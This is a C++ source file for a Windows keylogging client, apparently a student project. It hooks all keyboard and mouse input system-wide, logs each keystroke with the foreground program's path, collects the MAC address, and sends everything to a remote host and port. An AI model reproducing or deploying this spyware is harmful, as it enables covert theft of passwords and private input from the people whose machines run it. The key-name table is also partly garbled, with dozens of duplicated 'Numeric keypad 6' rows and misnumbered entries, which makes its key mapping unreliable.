#include "Client.h"

// NONE, MAJ, ALTGR
std::string gVirtualKeyCode[255][3] = {
	{ "ERROR", "ERROR", "ERROR" },
	{ "Left mouse button", "Left mouse button", "Left mouse button" },								// VK_LBUTTON	0x01
	{ "Right mouse button", "Right mouse button", "Right mouse button" },							// VK_RBUTTON	0x02
	{ "Control-break processing", "Control-break processing", "Control-break processing" },			// VK_CANCEL	0x03
	{ "Middle mouse button", "Middle mouse button", "Middle mouse button" },						// VK_MBUTTON	0x04
	{ "X1 mouse button", "X1 mouse button", "X1 mouse button" },									// VK_XBUTTON1	0x05
	{ "X2 mouse button", "X2 mouse button", "X2 mouse button" },									// VK_XBUTTON2	0x06
	{ "Undefined", "Undefined", "Undefined" },														// -			0x07
	{ "BACKSPACE", "BACKSPACE", "BACKSPACE" },														// VK_BACK		0x08
	{ "TAB", "TAB", "TAB" },																		// VK_TAB		0x09
	{ "Reserved", "Reserved", "Reserved" },															// -			0x0A
	{ "Reserved", "Reserved", "Reserved" },															// -			0x0B
	{ "CLEAR", "CLEAR", "CLEAR" },																	// VK_CLEAR		0x0C
	{ "ENTER", "ENTER", "ENTER" },																	// VK_RETURN	0x0D
	{ "Undefined", "Undefined", "Undefined" },														// -			0x0E
	{ "Undefined", "Undefined", "Undefined" },														// -			0x0F
	{ "SHIFT", "SHIFT", "SHIFT" },																	// VK_SHIFT		0x10
	{ "CTRL", "CTRL", "CTRL" },																		// VK_CONTROL	0x11
	{ "ALT", "ALT", "ALT" },																		// VK_MENU		0x12
	{ "PAUSE", "PAUSE", "PAUSE" },																	// VK_PAUSE		0x13
	{ "CAPS LOCK", "CAPS LOCK", "CAPS LOCK" },														// VK_CAPITAL	0x14
	{ "IME Kana mode", "IME Kana mode", "IME Kana mode" },											// VK_KANA		0x15
	{ "Undefined", "Undefined", "Undefined" },														// -			0x16
	{ "IME Junja mode", "IME Junja mode", "IME Junja mode" },										// VK_JUNJA		0x17
	{ "IME final mode", "IME final mode", "IME final mode" },										// VK_FINAL		0x18
	{ "IME Hanja mode", "IME Hanja mode", "IME Hanja mode" },										// VK_HANJA		0x19
	{ "Undefined", "Undefined", "Undefined" },														// -			0x1A
	{ "ESC", "ESC", "ESC" },																		// VK_ESCAPE	0x1B
	{ "IME convert", "IME convert", "IME convert" },												// VK_CONVERT	0x1C
	{ "IME nonconvert", "IME nonconvert", "IME nonconvert" },										// VK_NONCONVERT0x1D
	{ "IME accept", "IME accept", "IME accept" },													// VK_ACCEPT	0x1E
	{ "IME mode change request", "IME mode change request", "IME mode change request" },			// VK_MODECHANGE0x1F
	{ "SPACEBAR", "SPACEBAR", "SPACEBAR" },															// VK_SPACE		0x20
	{ "PAGE UP", "PAGE UP", "PAGE UP" },															// VK_PRIOR		0x21
	{ "PAGE DOWN", "PAGE DOWN", "PAGE DOWN" },														// VK_NEXT		0x22
	{ "END", "END", "END" },																		// VK_END		0x23
	{ "HOME", "HOME", "HOME" },																		// VK_HOME		0x24
	{ "LEFT ARROW", "LEFT ARROW", "LEFT ARROW" },													// VK_LEFT		0x25
	{ "UP ARROW", "UP ARROW", "UP ARROW" },															// VK_UP		0x26
	{ "RIGTH ARROW", "RIGTH ARROW", "RIGTH ARROW" },												// VK_RIGTH		0x27
	{ "DOWN ARROW", "DOWN ARROW", "DOWN ARROW" },													// VK_DOWN		0x28
	{ "SELECT", "SELECT", "SELECT" },																// VK_SELECT	0x29
	{ "PRINT", "PRINT", "PRINT" },																	// VK_PRINT		0x2A
	{ "EXECUTE", "EXECUTE", "EXECUTE" },															// VK_EXECUTE	0x2B
	{ "PRINT SCREEN", "PRINT SCREEN", "PRINT SCREEN" },												// VK_SNAPSHOT	0x2C
	{ "INS", "INS", "INS" },																		// VK_INSERT	0x2D
	{ "DEL", "DEL", "DEL" },																		// VK_DELETE	0x2E
	{ "HELP", "HELP", "HELP" },																		// VK_HELP		0x2F
	{ "à", "0", "@" },																				//				0x30
	{ "&", "1", "" },																				//				0x31
	{ "é", "2", "~" },																				//				0x32
	{ "\"", "3", "#" },																				//				0x33
	{ "'", "4", "{" },																				//				0x34
	{ "(", "5", "[" },																				//				0x35
	{ "-", "6", "|" },																				//				0x36
	{ "è", "7", "`" },																				//				0x37
	{ "_", "8", "\\" },																				//				0x38
	{ "ç", "9", "^" },																				//				0x39
	{ "Undefined", "Undefined", "Undefined" },														// -			0x3A
	{ "Undefined", "Undefined", "Undefined" },														// -			0x3B
	{ "Undefined", "Undefined", "Undefined" },														// -			0x3C
	{ "Undefined", "Undefined", "Undefined" },														// -			0x3D
	{ "Undefined", "Undefined", "Undefined" },														// -			0x3E
	{ "Undefined", "Undefined", "Undefined" },														// -			0x3F
	{ "Undefined", "Undefined", "Undefined" },														// -			0x40
	{ "a", "A", "" },																				//				0x41
	{ "b", "B", "" },																				//				0x42
	{ "c", "C", "" },																				//				0x43
	{ "d", "D", "" },																				//				0x44
	{ "e", "E", "" },																				//				0x45
	{ "f", "F", "" },																				//				0x46
	{ "g", "G", "" },																				//				0x47
	{ "h", "H", "" },																				//				0x48
	{ "i", "I", "" },																				//				0x49
	{ "j", "J", "" },																				//				0x4A
	{ "k", "K", "" },																				//				0x4B
	{ "l", "L", "" },																				//				0x4C
	{ "m", "M", "" },																				//				0x4D
	{ "n", "N", "" },																				//				0x4E
	{ "o", "O", "" },																				//				0x4F
	{ "p", "P", "" },																				//				0x50
	{ "q", "Q", "" },																				//				0x51
	{ "r", "R", "" },																				//				0x52
	{ "s", "S", "" },																				//				0x53
	{ "t", "T", "" },																				//				0x54
	{ "u", "U", "" },																				//				0x55
	{ "v", "V", "" },																				//				0x56
	{ "w", "W", "" },																				//				0x57
	{ "x", "X", "" },																				//				0x58
	{ "y", "Y", "" },																				//				0x59
	{ "z", "Z", "" },																				//				0x5A
	{ "Left Windows", "Left Windows", "Left Windows" },												// VK_LWIN		0x5B
	{ "Right Windows", "Right Windows", "Right Windows" },											// VK_RWIN		0x5C
	{ "Applications", "Applications", "Applications" },												// VK_APPS		0x5D
	{ "Reserved", "Reserved", "Reserved" },															// -			0x5E
	{ "Computer Sleep", "Computer Sleep", "Computer Sleep" },										// VK_SLEEP		0x5F
	{ "Numeric keypad 0", "Numeric keypad 0", "Numeric keypad 0" },									// VK_NUMPAD0	0x60
	{ "Numeric keypad 1", "Numeric keypad 1", "Numeric keypad 1" },									// VK_NUMPAD1	0x61
	{ "Numeric keypad 2", "Numeric keypad 2", "Numeric keypad 2" },									// VK_NUMPAD2	0x62
	{ "Numeric keypad 3", "Numeric keypad 3", "Numeric keypad 3" },									// VK_NUMPAD3	0x63
	{ "Numeric keypad 4", "Numeric keypad 4", "Numeric keypad 4" },									// VK_NUMPAD4	0x64
	{ "Numeric keypad 5", "Numeric keypad 5", "Numeric keypad 5" },									// VK_NUMPAD5	0x65
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0x8A
	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0x8B
	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0x8C
	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0x8D
	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0x8E
	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0x8F
	{ "NUM LOCK", "NUM LOCK", "NUM LOCK" },															// VK_NUMLOCK	0x90
	{ "SCROLL LOCK", "SCROLL LOCK", "SCROLL LOCK" },												// VK_SCROLL	0x91
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0x92
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0x93
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0x94
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0x95
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0x96
	{ "Unassigned", "Unassigned", "Unassigned" },													//				0x97
	{ "Unassigned", "Unassigned", "Unassigned" },													//				0x98
	{ "Unassigned", "Unassigned", "Unassigned" },													//				0x99
	{ "Unassigned", "Unassigned", "Unassigned" },													//				0x9A
	{ "Unassigned", "Unassigned", "Unassigned" },													//				0x9B
	{ "Unassigned", "Unassigned", "Unassigned" },													//				0x9C
	{ "Unassigned", "Unassigned", "Unassigned" },													//				0x9D
	{ "Unassigned", "Unassigned", "Unassigned" },													//				0x9E
	{ "Unassigned", "Unassigned", "Unassigned" },													//				0x9F
	{ "Left SHIFT", "Left SHIFT", "Left SHIFT" },													// VK_LSHIFT	0xA0
	{ "Right SHIFT", "Right SHIFT", "Right SHIFT" },												// VK_RSHIFT	0xA1
	{ "Left CONTROL", "Left CONTROL", "Left CONTROL" },												// VK_LCONTROL	0xA2
	{ "Right CONTROL", "Right CONTROL", "Right CONTROL" },											// VK_RCONTROL	0xA3
	{ "Left MENU", "Left MENU", "Left MENU" },														// VK_LMENU		0xA4
	{ "Right MENU", "Right MENU", "Right MENU" },													// VK_RMENU		0xA5
	{ "Browser Back", "Browser Back", "Browser Back" },												// VK_BROWSER_BACK	0xA6
	{ "Browser Forward", "Browser Forward", "Browser Forward" },									// VK_BROWSER_FORWARD	0xA7
	{ "Browser Refresh", "Browser Refresh", "Browser Refresh" },									// VK_BROWSER_REFRESH	0xA8
	{ "Browser Stop", "Browser Stop", "Browser Stop" },												// VK_BROWSER_STOP	0xA9
	{ "Browser Search", "Browser Search", "Browser Search" },										// VK_BROWSER_SEARCH	0xAA
	{ "Browser Favorites", "Browser Favorites", "Browser Favorites" },								// VK_BROWSER_FAVORITES	0xAB
	{ "Browser Start and Home", "Browser Start and Home", "Browser Start and Home" },				// VK_BROWSER_HOME	0xAC
	{ "Volume Mute", "Volume Mute", "Volume Mute" },												// VK_VOLUME_MUTE	0xAD
	{ "Volume Down", "Volume Down", "Volume Down" },												// VK_VOLUME_DOWN	0xAE
	{ "Volume Up", "Volume Up", "Volume Up" },														// VK_VOLUME_UP		0xAF
	{ "Next Track", "Next Track", "Next Track" },													// VK_MEDIA_NEXT_TRACK	0xB0
	{ "Previous Track", "Previous Track", "Previous Track" },										// VK_MEDIA_PREV_TRACK	0xB1
	{ "Stop Media", "Stop Media", "Stop Media" },													// VK_MEDIA_STOP	0xB2
	{ "Play/Pause Media", "Play/Pause Media", "Play/Pause Media" },									// VK_MEDIA_PLAY_PAUSE	0xB3
	{ "Start Mail", "Start Mail", "Start Mail" },													// VK_LAUNCH_MAIL	0xB4
	{ "Select Media", "Select Media", "Select Media" },												// VK_LAUNCH_MEDIA_SELECT	0x85
	{ "Start Application 1", "Start Application 1", "Start Application 1" },						// VK_LAUNCH_APP1	0xB6
	{ "Start Application 2", "Start Application 2", "Start Application 2" },						// VK_LAUNCH_APP2	0xB7
	{ "Reserved", "Reserved", "Reserved" },															// -			0xB8
	{ "Reserved", "Reserved", "Reserved" },															// -			0xB9
	{ "$", "£", "¤" },																				// VK_OEM_1		0xBA
	{ "=", "+", "}" },																				// VK_OEM_PLUS	0xBB
	{ ",", "?", "" },																				// VK_OEM_COMMA	0xBC
	{ "-", "-", "-" },																				// VK_OEM_MINUS	0xBD
	{ ";", ".", "" },																				// VK_OEM_PERIOD	0xBE
	{ ":", "/", "" },																				// VK_OEM_2		0xBF
	{ "ù", "%", "" },																				// VK_OEM_3		0xC0
	{ "Reserved", "Reserved", "Reserved" },															// -			0xC1
	{ "Reserved", "Reserved", "Reserved" },															// -			0xC2
	{ "Reserved", "Reserved", "Reserved" },															// -			0xC3
	{ "Reserved", "Reserved", "Reserved" },															// -			0xC4
	{ "Reserved", "Reserved", "Reserved" },															// -			0xC5
	{ "Reserved", "Reserved", "Reserved" },															// -			0xC6
	{ "Reserved", "Reserved", "Reserved" },															// -			0xC7
	{ "Reserved", "Reserved", "Reserved" },															// -			0xC8
	{ "Reserved", "Reserved", "Reserved" },															// -			0xC9
	{ "Reserved", "Reserved", "Reserved" },															// -			0xCA
	{ "Reserved", "Reserved", "Reserved" },															// -			0xCB
	{ "Reserved", "Reserved", "Reserved" },															// -			0xCC
	{ "Reserved", "Reserved", "Reserved" },															// -			0xCD
	{ "Reserved", "Reserved", "Reserved" },															// -			0xCE
	{ "Reserved", "Reserved", "Reserved" },															// -			0xCF
	{ "Reserved", "Reserved", "Reserved" },															// -			0xD0
	{ "Reserved", "Reserved", "Reserved" },															// -			0xD1
	{ "Reserved", "Reserved", "Reserved" },															// -			0xD2
	{ "Reserved", "Reserved", "Reserved" },															// -			0xD3
	{ "Reserved", "Reserved", "Reserved" },															// -			0xD4
	{ "Reserved", "Reserved", "Reserved" },															// -			0xD5
	{ "Reserved", "Reserved", "Reserved" },															// -			0xD6
	{ "Reserved", "Reserved", "Reserved" },															// -			0xD7
	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0xD8
	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0xD9
	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0xDA
	{ ")", "°", "]" },																				// VK_OEM_4		0xDB
	{ "*", "µ", "" },																				// VK_OEM_5		0xDC
	{ "Accent circonflexe", "trema", "" },															// VK_OEM_6		0xDD
	{ "²", "", "" },																				// VK_OEM_7		0xDE
	{ "!", "§", "" },																				// VK_OEM_8		0xDF
	{ "Reserved", "Reserved", "Reserved" },															// -			0xE0
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xE1
	{ "angle bracket or backslash", "angle bracket or backslash", "angle bracket or backslash" },	// VK_OEM_102	0xE2
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xE3
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xE4
	{ "IEM PROCESS", "IEM PROCESS", "IEM PROCESS" },												// VK_PROCESSKEY0xE5
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xE6
	{ "Packet", "Packet", "Packet" },																// VK_PACKET	0xE7
	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0xE8
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xE9
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xEA
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xEB
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xEC
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xED
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xEE
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xEF
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xF1
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xF2
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xF3
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xF4
	{ "OEM specific", "OEM specific", "OEM specific" },												//				0xF5
	{ "Attn", "Attn", "Attn" },																		// VK_ATTN		0xF6
	{ "CrSel", "CrSel", "CrSel" },																	// VK_CRSEL		0xF7
	{ "ExSel", "ExSel", "ExSel" },																	// VK_EXSEL		0xF8
	{ "Erase EOF", "Erase EOF", "Erase EOF" },														// VK_EREOF		0xF9
	{ "Play", "Play", "Play" },																		// VK_PLAY		0xFA
	{ "Zoom", "Zoom", "Zoom" },																		// VK_ZOOM		0xFB
	{ "Reserved", "Reserved", "Reserved" },															// VK_NONAME	0xFC
	{ "PA1", "PA1", "PA1" },																		// VK_PA1		0xFD
	{ "Clear", "Clear", "Clear" }																	// VK_OEM_CLEAR	0xFE
};
extern Client clt;

Client::Client() : m_Alt(false), m_Shift(false), m_Ctrl(false), m_CapsLock(false), m_AltGr(false),
	m_time("Time_Windows.dll"),
	m_socket("Socket_Windows.dll"),
	m_protocol("protocolv1.dll"),
	m_new_itime(m_time.get_symbole<fct_new_itime>(NAME_FCT_NEW_ITIME)),
    m_iselect(m_socket.get_symbole<fct_iselect>(NAME_FCT_ISELECT)),
	m_new_iclient(m_socket.get_symbole<fct_new_iclient>(NAME_FCT_NEW_ICLIENT)),
	m_new_iprotocol(m_protocol.get_symbole<fct_new_iprotocol>(NAME_FCT_NEW_IPROTOCOL)),
	m_itime(m_new_itime())
{
}

Client::~Client()
{
	unsetKeyboardHook();
	unsetMouseHook();
}

void		Client::setKeyboardHook(void)
{
	m_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
}

void		Client::setMouseHook(void)
{
	m_mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);
}

void		Client::unsetHook(HHOOK hook)
{
	UnhookWindowsHookEx(hook);
}

void		Client::unsetKeyboardHook(void)
{
	unsetHook(m_keyboardHook);
}

void		Client::unsetMouseHook(void)
{
	unsetHook(m_mouseHook);
}

void		Client::run(std::string const &host, std::string const &port)
{
	ITime	&time(m_new_itime());
	IProtocol	&protocol(m_new_iprotocol(m_new_iclient(host, port), m_new_itime()));

	time.set_second(1);
	time.set_nano(0);
	protocol.mac_address(m_MAC);
	while (true)
	{
		protocol.select();
		m_iselect(&time);
		m_mutex.lock();
		for (auto it = m_events.begin(); it != m_events.end(); it++)
		{
			if ((*it)->getInput() == Keyboard)
			{
				KeyboardEvent &key(*reinterpret_cast<KeyboardEvent *>(*it));
				std::list<IProtocol::Keyboard *>	list;
				IProtocol::Keyboard	keyboard{ key.getSecond(), key.getNano(), key.getEvent(), key.getKeyData().getName(), key.getWinName() };
				list.push_back(&keyboard);
				protocol.keyboard(list);
			}
			else if ((*it)->getInput() == Mouse)
			{
				MouseEvent &tmp(*reinterpret_cast<MouseEvent *>(*it));
				std::list<IProtocol::Mouse *>	list;
				IProtocol::Mouse	mouse{ tmp.getSecond(), tmp.getNano(), tmp.getPos().getX(), tmp.getPos().getY(), 0, tmp.getEvent(), tmp.getButtonData().getName(), tmp.getWinName() };
				list.push_back(&mouse);
				protocol.mouse(list);
			}
			delete *it;
		}
		m_events.clear();
		m_mutex.unlock();
		protocol.run();
	}
}

void		Client::sendBackMessage(void)
{
	MSG		message;

	while (GetMessage(&message, NULL, 0, 0))
	{
		m_mutex.lock();
		TranslateMessage(&message);
		DispatchMessage(&message);
		m_mutex.unlock();
	}
}

void		Client::setShift(bool shift)
{
	m_Shift = shift;
}

void		Client::setCtrl(bool ctrl)
{
	m_Ctrl = ctrl;
}

void		Client::setAlt(bool alt)
{
	m_Alt = alt;
}

void		Client::setCapsLock(bool capsLock)
{
	m_CapsLock = capsLock;
}

void		Client::setAltGr(bool altGr)
{
	m_AltGr = altGr;
}

bool		Client::getShift(void)
{
	return (m_Shift);
}

bool		Client::getCtrl(void)
{
	return (m_Ctrl);
}

bool		Client::getAlt(void)
{
	return (m_Alt);
}

bool		Client::getCapsLock(void)
{
	return (m_CapsLock);
}

bool		Client::getAltGr(void)
{
	return (m_AltGr);
}

int		Client::getMod(void)
{
	if (m_Shift)
		return (1);
	else if (m_AltGr)
		return (2);
	return (0);
}

void		Client::addEvent(Event *e)
{
	m_events.push_back(e);
}

bool		Client::isValidMac(PIP_ADAPTER_INFO adapterInfo)
{
	if (adapterInfo->DhcpEnabled)
	{
		if (std::string(adapterInfo->IpAddressList.IpAddress.String).compare("0.0.0.0") == 0)
			return (false);
		else
			return (true);
	}
	else
		return (false);
}

std::string	Client::addrToString(unsigned char mac[])
{
	char	tab[18];

	sprintf_s(tab, "%02X%02X%02X%02X%02X%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	return (std::string(tab));
}

void		Client::getMACAddress(void)
{
	bool	macIsSet = false;
	IP_ADAPTER_INFO AdapterInfo[16];
	DWORD dwBufLen = sizeof(AdapterInfo);
	DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
	if (dwStatus == ERROR_SUCCESS)
	{
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;

		while (pAdapterInfo && !macIsSet)
		{
			if (isValidMac(pAdapterInfo))
			{
				m_MAC = addrToString(pAdapterInfo->Address);
				macIsSet = true;
			}
			pAdapterInfo = pAdapterInfo->Next;
		}
	}
}

void				setModifier(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT		*a;

	a = (KBDLLHOOKSTRUCT*)lParam;
	switch (a->vkCode)
	{
	case VK_LSHIFT:
	case VK_RSHIFT:
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
			clt.setShift(true);
		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
			clt.setShift(false);
		break;
	case VK_MENU:
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
			clt.setAlt(true);
		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
			clt.setAlt(false);
		break;
	case VK_CONTROL:
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
			clt.setCtrl(true);
		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
			clt.setCtrl(false);
		break;
	case VK_CAPITAL:
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
			clt.setCapsLock(true);
		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
			clt.setCapsLock(false);
	default:
		break;
	}
}

std::string			getWindowName()
{
	std::string winName("");

	HWND		fWin = GetForegroundWindow();
	if (fWin)
	{
		DWORD	threadId;
		GetWindowThreadProcessId(fWin, &threadId);
		HANDLE	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, threadId);
		if (hProcess)
		{
			char	name[256];

			if (GetModuleFileNameEx(hProcess, NULL, name, sizeof(name)))
				winName = name;
		}
	}
	return winName;
}

LRESULT CALLBACK	KeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
{
	KBDLLHOOKSTRUCT		*hookInfo;
		
	if (nCode == HC_ACTION)
	{
		setModifier(nCode, wParam, lParam);
		hookInfo = (KBDLLHOOKSTRUCT*)lParam;
		Key			key(gVirtualKeyCode[hookInfo->vkCode][clt.getMod()], hookInfo->vkCode);
		Modifier	mod(clt.getCtrl(), clt.getAlt(), clt.getShift(), clt.getCapsLock());
		eEventType	etype;
		std::string	winName = getWindowName();

		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
			etype = Pressed;
		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
			etype = Released;
		clt.m_itime.now();
		KeyboardEvent *kbEv = new KeyboardEvent(key, mod, etype, clt.m_itime.get_second(), clt.m_itime.get_nano(), winName);
		clt.addEvent(kbEv);
	}
	return (CallNextHookEx(NULL, nCode, wParam, lParam));
}

LRESULT CALLBACK MouseProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
{
	MSLLHOOKSTRUCT		*hookInfo;

	if (nCode >= HC_ACTION)
	{
		std::string		name;
		hookInfo = (MSLLHOOKSTRUCT*)lParam;
		Position pos(hookInfo->pt.x, hookInfo->pt.y);
		eEventType etype;
		switch (wParam)
		{
			case WM_LBUTTONDOWN:
				name = "Left Button Down";
				etype = Pressed;
				break;
			case WM_LBUTTONUP:
				name = "Left Button Up";
				etype = Released;
				break;
			case WM_MOUSEMOVE:
				name = "Mouse Move";
				etype = Move;
				break;
			case WM_MOUSEWHEEL:
				name = "Mouse Wheel (vertical scrolling)";
				etype = Scroll;
				break;
			case WM_MOUSEHWHEEL:
				name = "Mouse Wheel (horizontal scrolling)";
				etype = Scroll;
				break;
			case WM_RBUTTONDOWN:
				name = "Right Button Down";
				etype = Pressed;
				break;
			case WM_RBUTTONUP:
				name = "Right Button Up";
				etype = Released;
				break;
		}
		Button button(name, hookInfo->mouseData);

		clt.m_itime.now();
		MouseEvent *msEv = new MouseEvent(button, pos, etype, clt.m_itime.get_second(), clt.m_itime.get_nano(), getWindowName());
		clt.addEvent(msEv);
	}
	return (CallNextHookEx(NULL, nCode, wParam, lParam));
}